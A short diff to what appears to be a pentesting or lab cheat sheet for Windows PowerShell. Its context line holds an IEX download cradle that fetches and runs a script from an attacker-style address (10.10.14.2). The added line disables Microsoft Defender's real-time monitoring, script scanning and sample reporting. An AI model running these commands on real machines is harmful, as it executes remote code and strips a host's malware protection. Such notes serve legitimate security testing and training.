@@ -73,8 +73,9 @@ IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.2:80/script.ps1')
 True
 ```
 
-### Check antivirus
+### Check antivirus and disable
 
 ```powershell
 Get-MpComputerStatus | Select-Object AntivirusEnabled
+Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend
 ```
